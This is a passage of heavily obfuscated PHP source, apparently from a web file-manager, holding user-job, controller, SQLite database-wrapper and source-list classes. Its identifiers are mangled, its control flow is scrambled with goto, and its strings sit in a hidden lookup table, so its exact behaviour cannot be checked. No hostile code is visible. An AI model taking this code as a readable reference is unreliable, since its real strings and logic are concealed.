E¹é¬äÓ£´; d©ÔÇÉõ®¦: return $bƒä¡¶ÓÚ× . "\x28{$Eš•íÑ™Î}\x29"; goto Bø¯÷¥¨ß; E¹é¬äÓ£´: $CéÕç¹‡†¯ =& $_SERVER[Ö]; $Cƒİ—£ºÅÀ = array($CéÕç¹‡†¯[1405] => USER_ID, $CéÕç¹‡†¯[432] => 0); $E·Ä«†õ½Í = $this->field($CéÕç¹‡†¯[28])->where($Cƒİ—£ºÅÀ)->select(); goto D¢í’Ì×õÀ; D¢í’Ì×õÀ: $E·Ä«†õ½Í = array_to_keyvalue($E·Ä«†õ½Í, $CéÕç¹‡†¯[33], $CéÕç¹‡†¯[28]); if (!$E·Ä«†õ½Í || !in_array($bƒä¡¶ÓÚ×, $E·Ä«†õ½Í)) { return $bƒä¡¶ÓÚ×; } for ($Eš•íÑ™Î = 0; $Eš•íÑ™Î < count($E·Ä«†õ½Í); $Eš•íÑ™Î++) { if (!in_array($bƒä¡¶ÓÚ× . "\x28{$Eš•íÑ™Î}\x29", $E·Ä«†õ½Í)) { return $bƒä¡¶ÓÚ× . "\x28{$Eš•íÑ™Î}\51"; } } goto d©ÔÇÉõ®¦; Bø¯÷¥¨ß: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\x6a\x6f\x62\x4c\151\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\144\145\163\143", "\x73\157\162\164"); const JOB_KEY = "\x73\x65\154\x66\x4a\x6f\x62\x4c\x69\163\164"; public function listData($aÃÍÇ§¶ = false, $fÎÀÛõ£Íà = "\x73\x6f\x72\164", $E™¢î»¼Í‘ = false) { return parent::listData($aÃÍÇ§¶, $fÎÀÛõ£Íà, $E™¢î»¼Í‘); } public function remove($AïÈñ­–·²) { return parent::remove($AïÈñ­–·²); } public function add($Aäìà¤œ‡©) { $eîäÒîò„† =& $_SERVER[Ö]; if ($this->findByName($Aäìà¤œ‡©[$eîäÒîò„†[28]])) { return !1; } $Aäìà¤œ‡©[$eîäÒîò„†[2098]] = $this->getSort(); return parent::insert($Aäìà¤œ‡©); } private function getSort() { $cŸé³ùæè =& $_SERVER[Ö]; $Aòº¾Ê‹Ø = parent::listData(); $dæí‹ï = array_to_keyvalue($Aòº¾Ê‹Ø, $cŸé³ùæè[33], $cŸé³ùæè[2098]); return empty($dæí‹ï) ? 0 : max($dæí‹ï) + 1; } public function update($BĞ´ÛÁÀêå, $F…Ø£Ú®ÏÊ) { $eñà‰‰ØÚô =& $_SERVER[Ö]; $CÖ°éŠ‰Õó = parent::listData($BĞ´ÛÁÀêå); $e²ÍŠŠ¨ø = $this->findByName($F…Ø£Ú®ÏÊ[$eñà‰‰ØÚô[28]]); if (!$CÖ°éŠ‰Õó || $e²ÍŠŠ¨ø && $e²ÍŠŠ¨ø[$eñà‰‰ØÚô[363]] != $CÖ°éŠ‰Õó[$eñà‰‰ØÚô[363]]) { return !1; } return parent::update($BĞ´ÛÁÀêå, $F…Ø£Ú®ÏÊ); } public function setUserJob($EÒ›ìª¤è, $b»¤ç…–ŞÈ) { goto AÕ¦›ĞåÖ†; DÜŸš•ƒ…Ô: $Eİ³Şø…½ª = rtrim($Eİ³Şø…½ª, $d“‚Ç¥ù†[47]); Model($d“‚Ç¥ù†[473])->metaSet($EÒ›ìª¤è, self::JOB_KEY, $Eİ³Şø…½ª); goto cíÑ‹£ï©; AÕ¦›ĞåÖ†: $d“‚Ç¥ù† =& $_SERVER[Ö]; if (!is_array($b»¤ç…–ŞÈ)) { $b»¤ç…–ŞÈ = array($b»¤ç…–ŞÈ); } $B«©­â µ¿ = parent::listData(); goto C‘˜´í‡¼×; C‘˜´í‡¼×: $c•²‰Û£¼ô = array_to_keyvalue($B«©­â µ¿, $d“‚Ç¥ù†[28]); $Eİ³Şø…½ª = $d“‚Ç¥ù†[357]; foreach ($b»¤ç…–ŞÈ as $CÛØŞ½³ÄÍ) { if ($c•²‰Û£¼ô[$CÛØŞ½³ÄÍ]) { $Eİ³Şø…½ª .= $c•²‰Û£¼ô[$CÛØŞ½³ÄÍ][$d“‚Ç¥ù†[363]] . $d“‚Ç¥ù†[47]; } else { $Bˆ³Ê¬Êé = $this->add($CÛØŞ½³ÄÍ); $Eİ³Şø…½ª .= $Bˆ³Ê¬Êé . $d“‚Ç¥ù†[47]; } } goto DÜŸš•ƒ…Ô; cíÑ‹£ï©: } public function getUserJob($Fß‹µÁ¨“¡) { $CÑÓ‹¼˜ßŞ = Model($_SERVER[Ö][473])->metaGet($Fß‹µÁ¨“¡); return $this->getUserJobInfo($CÑÓ‹¼˜ßŞ[self::JOB_KEY]); } public function getUserJobInfo($eÑ­Ôàî’¡) { goto c˜®§÷’ª£; díâ®×‘à”: return $EàÑå„¶˜ò; goto d¤Æªâ®¡ˆ; fâ¥ùï……: $Dã¨Î‰…ÚÍ = array_remove_key($Dã¨Î‰…ÚÍ, $DÔ¥‡œ×ÃÌ[183]); $EàÑå„¶˜ò = array(); foreach ($dºÓ»ğ–Ùö as $dêö´ÒØä) { if (isset($Dã¨Î‰…ÚÍ[$dêö´ÒØä])) { $EàÑå„¶˜ò[] = $Dã¨Î‰…ÚÍ[$dêö´ÒØä]; } } goto díâ®×‘à”; c˜®§÷’ª£: $DÔ¥‡œ×ÃÌ =& $_SERVER[Ö]; $dºÓ»ğ–Ùö = explode($DÔ¥‡œ×ÃÌ[47], $eÑ­Ôàî’¡); $Dã¨Î‰…ÚÍ = parent::listData(); goto fâ¥ùï……; d¤Æªâ®¡ˆ: } } goto f¦Óë¢åÔ¶; E”îØôëÈù: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto E¯‰´»’…; E¯‰´»’…: $Dù½¥ˆÅä  =& $_SERVER[Ö]; global $in, $config; $this->config =& $config; goto dõèÓá§Â‚; dõèÓá§Â‚: $this->in =& $in; $this->values[$Dù½¥ˆÅä [6]] =& $config; $this->values[$Dù½¥ˆÅä [7]] =& $in; goto FÓáÊÎ’¾É; FÓáÊÎ’¾É: $this->tpl = TEMPLATE . MOD . $Dù½¥ˆÅä [8]; $this->_classObjectID = mt_rand(0, 10000); goto bÜùê¡ˆø–; bÜùê¡ˆø–: } public function loadClass($Aö…ÓÏÓëŠ) { if (1 === func_num_args()) { $this->{$Aö…ÓÏÓëŠ} = new $Aö…ÓÏÓëŠ(); } else { $f×Øµ›ƒí = new ReflectionClass($Aö…ÓÏÓëŠ); $fê·£ïÇ‰ = func_get_args(); array_shift($fê·£ïÇ‰); $this->{$Aö…ÓÏÓëŠ} = $f×Øµ›ƒí->newInstanceArgs($fê·£ïÇ‰); } return $this->{$Aö…ÓÏÓëŠ}; } protected function assign($DªÛ·ó‘Ã, $BÓ‡¯ƒÌÚ¶) { $this->values[$DªÛ·ó‘Ã] = $BÓ‡¯ƒÌÚ¶; } protected function display($eª±È¯ –Ë) { ob_end_clean(); extract($this->values); require $this->tpl . $eª±È¯ –Ë; } } class DbSqliteBase extends Db { public function __construct($EÔ†Üõ¸³¸ = '') { $D‹ä…’ˆ£Ç =& $_SERVER[Ö]; if (!extension_loaded($D‹ä…’ˆ£Ç[9])) { think_exception(think_lang($D‹ä…’ˆ£Ç[10]) . $D‹ä…’ˆ£Ç[11]); } if (!empty($EÔ†Üõ¸³¸)) { if (!isset($EÔ†Üõ¸³¸[$D‹ä…’ˆ£Ç[12]])) { $EÔ†Üõ¸³¸[$D‹ä…’ˆ£Ç[12]] = 438; } $this->config = $EÔ†Üõ¸³¸; if (empty($this->config[$D‹ä…’ˆ£Ç[13]])) { $this->config[$D‹ä…’ˆ£Ç[13]] = array(); } } } public function connect($bµÖäå‘·È = '', $eÀùÑ»Ù˜Ä = 0) { $FºÖÔåÇŒ¶ =& $_SERVER[Ö]; if (!isset($this->linkID[$eÀùÑ»Ù˜Ä])) { goto e³«ªˆÌ²Œ; e³«ªˆÌ²Œ: if (empty($bµÖäå‘·È)) { $bµÖäå‘·È = $this->config; } $Féâæ´–‘ç = !empty($bµÖäå‘·È[$FºÖÔåÇŒ¶[13]][$FºÖÔåÇŒ¶[14]]) ? $bµÖäå‘·È[$FºÖÔåÇŒ¶[13]][$FºÖÔåÇŒ¶[14]] : $this->pconnect; $C˜¯Éİ…ø = $Féâæ´–‘ç ? $FºÖÔåÇŒ¶[15] : $FºÖÔåÇŒ¶[16]; goto d®ƒÈâÂ; bËöèò½¹‘: @sqlite_busy_timeout($this->linkID[$eÀùÑ»Ù˜Ä], 30000); if (1 != think_config($FºÖÔåÇŒ¶[18])) { unset($this->config); } goto a‘¦‡±ŠçÏ; d®ƒÈâÂ: $this->linkID[$eÀùÑ»Ù˜Ä] = $C˜¯Éİ…ø($bµÖäå‘·È[$FºÖÔåÇŒ¶[17]], $bµÖäå‘·È[$FºÖÔåÇŒ¶[12]]); if (!$this->linkID[$eÀùÑ»Ù˜Ä]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto bËöèò½¹‘; a‘¦‡±ŠçÏ: } return $this->linkID[$eÀùÑ»Ù˜Ä]; } public function free() { $this->queryID = null; } public function query($f¬ÕŠÒ©ì) { goto A’ÎºÀ²Ú‹; e§¹¹ãŸ¦Ü: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $d¸äÚ×ØŸ = $this->getAll(); return $d¸äÚ×ØŸ; } goto dÛí³‚Ó; f‡õŠÔ¶¢˜: $this->queryStr = $f¬ÕŠÒ©ì; if ($this->queryID) { $this->free(); } think_action_status($d¢øì¥•Ğ[19], 1); goto EÆ ×’·‰¿; A’ÎºÀ²Ú‹: $d¢øì¥•Ğ =& $_SERVER[Ö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto f‡õŠÔ¶¢˜; EÆ ×’·‰¿: think_status($d¢øì¥•Ğ[20]); $this->queryID = sqlite_query($this->_linkID, $f¬ÕŠÒ©ì); $this->debug(); goto e§¹¹ãŸ¦Ü; dÛí³‚Ó: } public function execute($AÕ˜Öæñ¨ï) { goto Cò–ŒÃ††©; bˆÕèĞ¹á: $this->queryStr = $AÕ˜Öæñ¨ï; if ($this->queryID) { $this->free(); } think_action_status($eÉ¶¼×¥Úã[21], 1); goto BÙŸ›¡Î®¬; dÑ‚ƒòœöâ: if (!1 === $f°Ë¦…©®–) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto EøÓ¥çˆĞÎ; BÙŸ›¡Î®¬: think_status($eÉ¶¼×¥Úã[20]); $f°Ë¦…©®– = sqlite_exec($this->_linkID, $AÕ˜Öæñ¨ï); $this->debug(); goto dÑ‚ƒòœöâ; Cò–ŒÃ††©: $eÉ¶¼×¥Úã =& $_SERVER[Ö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bˆÕèĞ¹á; EøÓ¥çˆĞÎ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ö][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A·ø»ç›Úò = sqlite_query($this->_linkID, $_SERVER[Ö][23]); if (!$A·ø»ç›Úò) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $BŒÇ™Š‘ = sqlite_query($this->_linkID, $_SERVER[Ö][24]); if (!$BŒÇ™Š‘) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $AÔÆÒê•Ü” = array(); if ($this->numRows > 0) { for ($e‹ƒÅÛğôÒ = 0; $e‹ƒÅÛğôÒ < $this->numRows; $e‹ƒÅÛğôÒ++) { $AÔÆÒê•Ü”[$e‹ƒÅÛğôÒ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $AÔÆÒê•Ü”; } public function getFields($e®³øÉæëƒ) { $f·•ÑÇÉÀƒ =& $_SERVER[Ö]; $DÂ³ğĞˆ = $this->query($f·•ÑÇÉÀƒ[25] . $e®³øÉæëƒ . $f·•ÑÇÉÀƒ[26]); $Då¹Ä‡–™½ = array(); if ($DÂ³ğĞˆ) { foreach ($DÂ³ğĞˆ as $Fó„¹Ë¶Èš => $e®â±ÙÏî˜) { $Då¹Ä‡–™½[$e®â±ÙÏî˜[$f·•ÑÇÉÀƒ[27]]] = array($f·•ÑÇÉÀƒ[28] => $e®â±ÙÏî˜[$f·•ÑÇÉÀƒ[27]], $f·•ÑÇÉÀƒ[29] => $e®â±ÙÏî˜[$f·•ÑÇÉÀƒ[30]], $f·•ÑÇÉÀƒ[31] => (bool) ($e®â±ÙÏî˜[$f·•ÑÇÉÀƒ[32]] === $f·•ÑÇÉÀƒ[33]), $f·•ÑÇÉÀƒ[34] => $e®â±ÙÏî˜[$f·•ÑÇÉÀƒ[35]], $f·•ÑÇÉÀƒ[36] => strtolower($e®â±ÙÏî˜[$f·•ÑÇÉÀƒ[37]]) == $f·•ÑÇÉÀƒ[38], $f·•ÑÇÉÀƒ[39] => strtolower($e®â±ÙÏî˜[$f·•ÑÇÉÀƒ[40]]) == $f·•ÑÇÉÀƒ[41]); } } return $Då¹Ä‡–™½; } public function getTables($fì§®ŞïŠµ = '') { $A‹ï£ºŠ±İ =& $_SERVER[Ö]; $CŒ™¥‚ÌÊÊ = $this->query($A‹ï£ºŠ±İ[42] . $A‹ï£ºŠ±İ[43] . $A‹ï£ºŠ±İ[44]); $AÛ—×¦¦ = array(); foreach ($CŒ™¥‚ÌÊÊ as $d‰¡È…¢É => $Aïì±Óõö•) { $AÛ—×¦¦[$d‰¡È…¢É] = current($Aïì±Óõö•); } return $AÛ—×¦¦; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $B¨ÔÚ ï‘ =& $_SERVER[Ö]; $Dñƒ“ŒîŒ‘ = sqlite_last_error($this->_linkID); $this->error = $Dñƒ“ŒîŒ‘ . $B¨ÔÚ ï‘[4] . sqlite_error_string($Dñƒ“ŒîŒ‘); if ($B¨ÔÚ ï‘[33] != $this->queryStr) { $this->error .= LNG($B¨ÔÚ ï‘[45]) . $this->queryStr; } think_trace($this->error, $B¨ÔÚ ï‘[33], $B¨ÔÚ ï‘[46]); return $this->error; } public function escapeString($CÃòÓŠ‚Å“) { return sqlite_escape_string($CÃòÓŠ‚Å“); } public function parseLimit($CŠšëõõíƒ) { $FĞÕõ¦’Á” =& $_SERVER[Ö]; $e±íÛˆŸç­ = $FĞÕõ¦’Á”[33]; if (!empty($CŠšëõõíƒ)) { $CŠšëõõíƒ = explode($FĞÕõ¦’Á”[47], $CŠšëõõíƒ); if (count($CŠšëõõíƒ) > 1) { $e±íÛˆŸç­ .= $FĞÕõ¦’Á”[48] . $CŠšëõõíƒ[1] . $FĞÕõ¦’Á”[49] . $CŠšëõõíƒ[0] . $FĞÕõ¦’Á”[50]; } else { $e±íÛˆŸç­ .= $FĞÕõ¦’Á”[48] . $CŠšëõõíƒ[0] . $FĞÕõ¦’Á”[50]; } } return $e±íÛˆŸç­; } } class DbSqlite3Base extends Db { public function __construct($aÃ•Ò¼ÙñÍ = '') { $A†‹…àó’ =& $_SERVER[Ö]; if (!class_exists($A†‹…àó’[51])) { think_exception(think_lang($A†‹…àó’[10]) . $A†‹…àó’[52]); } if (!empty($aÃ•Ò¼ÙñÍ)) { if (!isset($aÃ•Ò¼ÙñÍ[$A†‹…àó’[12]])) { $aÃ•Ò¼ÙñÍ[$A†‹…àó’[12]] = 438; } $this->config = $aÃ•Ò¼ÙñÍ; if (empty($this->config[$A†‹…àó’[13]])) { $this->config[$A†‹…àó’[13]] = array(); } } } public function connect($aÔñ•à— = '', $A¯¡¤£³¼Ï = 0) { $f¦„£¤»õª =& $_SERVER[Ö]; if (!isset($this->linkID[$A¯¡¤£³¼Ï])) { if (empty($aÔñ•à—)) { $aÔñ•à— = $this->config; } $this->linkID[$A¯¡¤£³¼Ï] = new SQLite3($aÔñ•à—[$f¦„£¤»õª[17]]); if (!$this->linkID[$A¯¡¤£³¼Ï]) { think_exception($this->linkID[$A¯¡¤£³¼Ï]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$A¯¡¤£³¼Ï]->busyTimeout(30000); if (1 != think_config($f¦„£¤»õª[18])) { unset($this->config); } } return $this->linkID[$A¯¡¤£³¼Ï]; } public function free() { $this->queryID = null; } public function query($FàõÖšÅŠš) { goto c»¨§èÙ˜ß; FĞ÷é¢õ»—: if (!1 === $this->queryID) { $this->error(); return !1; } else { $aµï¤ß¬ˆ = $this->getAll(); $this->numRows = count($aµï¤ß¬ˆ); return $aµï¤ß¬ˆ; } goto d¾ŞšÃˆ‰; c»¨§èÙ˜ß: $eÖÛ÷¿É— =& $_SERVER[Ö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Cºôñ™¨Ğá; b†È¡ßµ®–: think_status($eÖÛ÷¿É—[20]); $this->queryID = $this->_linkID->query($FàõÖšÅŠš); $this->debug(); goto FĞ÷é¢õ»—; Cºôñ™¨Ğá: $this->queryStr = $FàõÖšÅŠš; if ($this->queryID) { $this->free(); } think_action_status($eÖÛ÷¿É—[19], 1); goto b†È¡ßµ®–; d¾ŞšÃˆ‰: } public function execute($bõèï·öÀ) { goto EØ±¸İ°…ğ; aŠÁ… ¯…‹: $this->queryStr = $bõèï·öÀ; if ($this->queryID) { $this->free(); } think_action_status($a™Š¡äÄ¹Ø[21], 1); goto f‹ÂÀøì¨¸; f‹ÂÀøì¨¸: think_status($a™Š¡äÄ¹Ø[20]); $aŠŠ™ÊÎ = $this->_linkID->exec($bõèï·öÀ); $this->debug(); goto B‡¿ˆî‚É; EØ±¸İ°…ğ: $a™Š¡äÄ¹Ø =& $_SERVER[Ö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aŠÁ… ¯…‹; B‡¿ˆî‚É: if (!1 === $aŠŠ™ÊÎ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto A˜Ì»®¹°; A˜Ì»®¹°: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ö][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $FÀç±¾êÑš = $this->_linkID->query($_SERVER[Ö][23]); if (!$FÀç±¾êÑš) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $cùãÌğ«ò = $this->_linkID->query($_SERVER[Ö][24]); if (!$cùãÌğ«ò) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Aê•Ù¹ÖñÈ = array(); while ($fÂåİÇæ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Aê•Ù¹ÖñÈ[] = $fÂåİÇæ; } $this->queryID->reset(); return $Aê•Ù¹ÖñÈ; } public function getFields($a¿¼¬½ëÒù) { $E¬è¾Ÿ„¬ =& $_SERVER[Ö]; $e±ñØƒô›Û = $this->query($E¬è¾Ÿ„¬[25] . $a¿¼¬½ëÒù . $E¬è¾Ÿ„¬[26]); $Aßº´Œœµñ = array(); if ($e±ñØƒô›Û) { foreach ($e±ñØƒô›Û as $DÇÊ½¿İ‰× => $Díò„Œ»â) { $Aßº´Œœµñ[$Díò„Œ»â[$E¬è¾Ÿ„¬[28]]] = array($E¬è¾Ÿ„¬[28] => $Díò„Œ»â[$E¬è¾Ÿ„¬[28]], $E¬è¾Ÿ„¬[29] => $Díò„Œ»â[$E¬è¾Ÿ„¬[29]], $E¬è¾Ÿ„¬[31] => (bool) ($Díò„Œ»â[$E¬è¾Ÿ„¬[31]] === $E¬è¾Ÿ„¬[33]), $E¬è¾Ÿ„¬[34] => $Díò„Œ»â[$E¬è¾Ÿ„¬[53]], $E¬è¾Ÿ„¬[36] => (bool) $Díò„Œ»â[$E¬è¾Ÿ„¬[54]], $E¬è¾Ÿ„¬[39] => (bool) $Díò„Œ»â[$E¬è¾Ÿ„¬[54]]); } } return $Aßº´Œœµñ; } public function getTables($B²ÉÖ…è†Û = '') { $dè¯ÖÁ¥¾ =& $_SERVER[Ö]; $E ´Ä”Û–  = $this->query($dè¯ÖÁ¥¾[42] . $dè¯ÖÁ¥¾[43] . $dè¯ÖÁ¥¾[44]); $CºÅ¦ªâ¢– = array(); foreach ($E ´Ä”Û–  as $e²•¨ñ±© => $aĞ¯«¶ˆ²…) { $CºÅ¦ªâ¢–[$e²•¨ñ±©] = current($aĞ¯«¶ˆ²…); } return $CºÅ¦ªâ¢–; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $B–Üá®ù =& $_SERVER[Ö]; $this->error = $this->_linkID->lastErrorMsg(); if ($B–Üá®ù[33] != $this->queryStr) { $this->error .= LNG($B–Üá®ù[45]) . $this->queryStr; } think_trace($this->error, $B–Üá®ù[33], $B–Üá®ù[46]); return $this->error; } public function escapeString($ağõ…¤ã”Í) { $a¿›ãºŞ =& $_SERVER[Ö]; if ($this->_linkID) { return $this->_linkID->escapeString($ağõ…¤ã”Í); } return str_ireplace($a¿›ãºŞ[55], $a¿›ãºŞ[56], $ağõ…¤ã”Í); } public function parseLimit($dÎíš…‰´) { $d˜ •‚ä¶â =& $_SERVER[Ö]; $C°À‘Íæ…ó = $d˜ •‚ä¶â[33]; if (!empty($dÎíš…‰´)) { $dÎíš…‰´ = explode($d˜ •‚ä¶â[47], $dÎíš…‰´); if (count($dÎíš…‰´) > 1) { $C°À‘Íæ…ó .= $d˜ •‚ä¶â[48] . $dÎíš…‰´[1] . $d˜ •‚ä¶â[49] . $dÎíš…‰´[0] . $d˜ •‚ä¶â[50]; } else { $C°À‘Íæ…ó .= $d˜ •‚ä¶â[48] . $dÎíš…‰´[0] . $d˜ •‚ä¶â[50]; } } return $C°À‘Íæ…ó; } } goto FÛé²¨íÍ¡; FÄóÓ‹ŞØÇ: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\x72\x63\x65"; protected $tableMeta = array("\x74\x61\142\154\x65\116\x61\x6d\x65" => "\151\157\x5f\x73\x6f\165\x72\x63\x65\x5f\155\145\x74\x61", "\155\145\164\141\106\x69\x65\x6c\144" => "\x73\x6f\165\162\143\145\111\104"); protected $dataAuto = array(array("\155\157\x64\x69\146\171\x54\x69\155\x65", "\164\x69\155\145", "\151\x6e\x73\x65\162\164", "\x66\x75\x6e\x63\x74\x69\x6f\x6e"), array("\143\x72\x65\x61\164\145\x54\x69\155\145", "\x74\x69\x6d\x65", "\151\x6e\x73\145\162\164", "\146\x75\x6e\143\x74\x69\157\x6e"), array("\x76\151\x65\x77\x54\151\x6d\145", "\x74\151\x6d\145", "\151\156\x73\145\x72\164", "\146\165\156\x63\164\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($CÉò°Â„î) { return $this->listSource(array($_SERVER[Ö][364] => $CÉò°Â„î)); } public function typeName($cæ»ê®Ñ…) { static $DŸİ¨…ËŒˆ = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\145\155", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\147\x72\157\x75\x70"); return $DŸİ¨…ËŒˆ[$cæ»ê®Ñ… . $_SERVER[Ö][33]]; } public function sourceListInfo($C÷ê´ÛçÅ’, $f¦ôÉ‚Àµ = false) { goto FŞÅëô„‘¢; a°ÅïÈ´¼¥: return array_to_keyvalue($aœ¡ØŸ¨±, $c¹î÷Ğì»[365]); goto EÁç²ÕË¡¦; FŞÅëô„‘¢: $c¹î÷Ğì» =& $_SERVER[Ö]; $C÷ê´ÛçÅ’ = $C÷ê´ÛçÅ’ ? $C÷ê´ÛçÅ’ : array(); $C÷ê´ÛçÅ’ = array_filter(array_unique($C÷ê´ÛçÅ’)); goto cö°…Ã‹â½; cö°…Ã‹â½: if (!$C÷ê´ÛçÅ’) { return array(); } $aœ¡ØŸ¨± = $this->where(array($c¹î÷Ğì»[365] => array($c¹î÷Ğì»[7], $C÷ê´ÛçÅ’)))->select(); $this->_listDataApply($aœ¡ØŸ¨±, $f¦ôÉ‚Àµ); goto a°ÅïÈ´¼¥; EÁç²ÕË¡¦: } public function pathInfoFilter($bòĞƒá˜¬å) { goto Aòçë•¡¡¸; b²¦éáÛßš: if (isset($bòĞƒá˜¬å[$c†Ïá„èõ®[372]]) && $bòĞƒá˜¬å[$c†Ïá„èõ®[372]][$c†Ïá„èõ®[373]] == -1) { $fÎÛîÉÁ†ë = array_remove_value($fÎÛîÉÁ†ë, $c†Ïá„èõ®[183]); $fÎÛîÉÁ†ë = array_remove_value($fÎÛîÉÁ†ë, $c†Ïá„èõ®[106]); $fÎÛîÉÁ†ë = array_remove_value($fÎÛîÉÁ†ë, $c†Ïá„èõ®[374]); $fÎÛîÉÁ†ë = array_remove_value($fÎÛîÉÁ†ë, $c†Ïá„èõ®[375]); $fÎÛîÉÁ†ë = array_remove_value($fÎÛîÉÁ†ë, $c†Ïá„èõ®[77]); $fÎÛîÉÁ†ë = array_remove_value($fÎÛîÉÁ†ë, $c†Ïá„èõ®[376]); } $bòĞƒá˜¬å = array_field_key($bòĞƒá˜¬å, $fÎÛîÉÁ†ë); return $bòĞƒá˜¬å; goto B°»¹Ÿ´¯; F…ïÚ½Ş‰Ê: $bòĞƒá˜¬å[$c†Ïá„èõ®[367]] = $this->typeName($bòĞƒá˜¬å[$c†Ïá„èõ®[367]]); if ($bòĞƒá˜¬å[$c†Ïá„èõ®[366]] != 1) { $bòĞƒá˜¬å[$c†Ïá„èõ®[156]] = $bòĞƒá˜¬å[$c†Ïá„èõ®[368]]; unset($bòĞƒá˜¬å[$c†Ïá„èõ®[368]]); } $cÄÉŠšÀ×Ù = $c†Ïá„èõ®[369]; goto B„”ö¨Ïô; B„”ö¨Ïô: $cÄÉŠšÀ×Ù .= $c†Ïá„èõ®[370]; $cÄÉŠšÀ×Ù .= $c†Ïá„èõ®[371]; $fÎÛîÉÁ†ë = explode($c†Ïá„èõ®[47], $cÄÉŠšÀ×Ù); goto b²¦éáÛßš; Aòçë•¡¡¸: $c†Ïá„èõ® =& $_SERVER[Ö]; $bòĞƒá˜¬å[$c†Ïá„èõ®[75]] = KodIO::make($bòĞƒá˜¬å[$c†Ïá„èõ®[365]]); $bòĞƒá˜¬å[$c†Ïá„èõ®[29]] = $bòĞƒá˜¬å[$c†Ïá„èõ®[366]] == 1 ? $c†Ïá„èõ®[76] : $c†Ïá„èõ®[163]; goto F…ïÚ½Ş‰Ê; B°»¹Ÿ´¯: } public function listUserFav() { goto d½Ü„‡•…ì; d½Ü„‡•…ì: $C™‡Å ÄØÁ =& $_SERVER[Ö]; $aŸæ‘³™äË = Model($C™‡Å ÄØÁ[377])->listData(); $fê÷âÆ¢ë‰ = array_filter_by_field($aŸæ‘³™äË, $C™‡Å ÄØÁ[29], $C™‡Å ÄØÁ[378]); goto DºªôáÆÙê; B­ÑãÒ›øà: foreach ($aŸæ‘³™äË as &$Böˆì‰›ç) { $Böˆì‰›ç = array($C™‡Å ÄØÁ[381] => $Böˆì‰›ç[$C™‡Å ÄØÁ[363]], $C™‡Å ÄØÁ[382] => $Böˆì‰›ç[$C™‡Å ÄØÁ[28]], $C™‡Å ÄØÁ[383] => $Böˆì‰›ç[$C™‡Å ÄØÁ[75]], $C™‡Å ÄØÁ[384] => $Böˆì‰›ç[$C™‡Å ÄØÁ[29]], $C™‡Å ÄØÁ[385] => $Böˆì‰›ç[$C™‡Å ÄØÁ[183]], $C™‡Å ÄØÁ[386] => $Böˆì‰›ç[$C™‡Å ÄØÁ[106]]); if ($Böˆì‰›ç[$C™‡Å ÄØÁ[29]] == $C™‡Å ÄØÁ[378] && $e««À„…ì¦[$Böˆì‰›ç[$C™‡Å ÄØÁ[75]]]) { $Böˆì‰›ç[$C™‡Å ÄØÁ[387]] = $e««À„…ì¦[$Böˆì‰›ç[$C™‡Å ÄØÁ[75]]]; } } return $aŸæ‘³™äË; goto E„˜—ñ£ß; DºªôáÆÙê: $fê÷âÆ¢ë‰ = array_to_keyvalue($fê÷âÆ¢ë‰, $C™‡Å ÄØÁ[33], $C™‡Å ÄØÁ[75]); if ($fê÷âÆ¢ë‰) { $e««À„…ì¦ = $this->listSource(array($C™‡Å ÄØÁ[379] => array($C™‡Å ÄØÁ[380], $fê÷âÆ¢ë‰))); } $e««À„…ì¦ = array_to_keyvalue($e««À„…ì¦[$C™‡Å ÄØÁ[350]], $C™‡Å ÄØÁ[365]); goto B­ÑãÒ›øà; E„˜—ñ£ß: } public function listUserTag($CöÄ´°÷®) { goto Dâ„Š¿¹ÙÖ; CëØô³å‰¶: $this->listUserTagClear($B‡éÉñí, $då©â¨—Ù³, $CöÄ´°÷®); return $då©â¨—Ù³; goto C™Şí‰Ùöà; A†ˆ÷‚èÓ: $B‡éÉñí = array_to_keyvalue($B‡éÉñí, $fšÁ†ŒÇÓ¤[33], $fšÁ†ŒÇÓ¤[75]); $då©â¨—Ù³ = array(); if ($B‡éÉñí) { $aáÅ©ƒ÷Ë« = array($fšÁ†ŒÇÓ¤[379] => array($fšÁ†ŒÇÓ¤[380], $B‡éÉñí)); $då©â¨—Ù³ = $this->listSource($aáÅ©ƒ÷Ë«); } goto CëØô³å‰¶; Dâ„Š¿¹ÙÖ: $fšÁ†ŒÇÓ¤ =& $_SERVER[Ö]; $dÅ„ä÷Îˆ = Model($fšÁ†ŒÇÓ¤[388])->listData(); 